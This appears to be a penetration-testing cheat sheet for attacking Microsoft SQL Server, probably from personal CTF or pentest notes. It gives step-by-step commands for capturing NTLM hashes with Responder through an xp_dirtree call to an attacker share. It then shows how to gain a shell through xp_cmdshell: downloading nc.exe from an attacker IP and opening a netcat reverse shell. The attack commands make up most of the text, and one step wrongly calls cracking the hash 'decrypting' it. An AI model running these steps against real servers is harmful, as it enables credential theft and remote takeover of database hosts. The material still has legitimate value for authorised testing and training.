# Microsoft SQL Server
---

### Capturing NTLM hashes
**Pre-requesties**
- Having access to the server.
- Downloading -> [**Responder.py**](https://github.com/SpiderLabs/Responder) (Intsalled by default in Kali)

 1. Running Responder.
```bash
sudo responder -I tun0 
```
 2. Starting an HTTPServer.
```bash
sudo python3 -m http.server 80
```
 3. Listing a fake share to trigger the protocol.
```bash
xp_dirtree "\\<ATTACKER-IP>\meow"
```
 4. Check Responder and take the hash and decrypt it.
### Gaining a shell
1. Log in using impacket-mssqlclient
```bash
impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<IP>
```
2. You can execute commands on MSSQL server using:
```bash
EXEC xp_cmdshell '<COMMAND>'
```
3. Then you can upload a `nc.exe`:
```bash
EXEC xp_cmdshell 'powershell -c curl http://<ATTACKER-IP>/nc.exe -o <PATH>'
```
4. Trigger it:
```bash
EXEC xp_cmdshell '<PATH>/nc.exe -e cmd <ATTACKER-IP> <PORT>'
```
> **Good tools:** 
> Microsoft SQL Database Attacking Tool -> [Msdat](https://github.com/quentinhardy/msdat)
> [Mssql.py](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py) (Make sure to run with python3 and specify the username without the domain)

## Further reading
- Four Parts ->  [Netspi](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- Cheatsheet -> [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)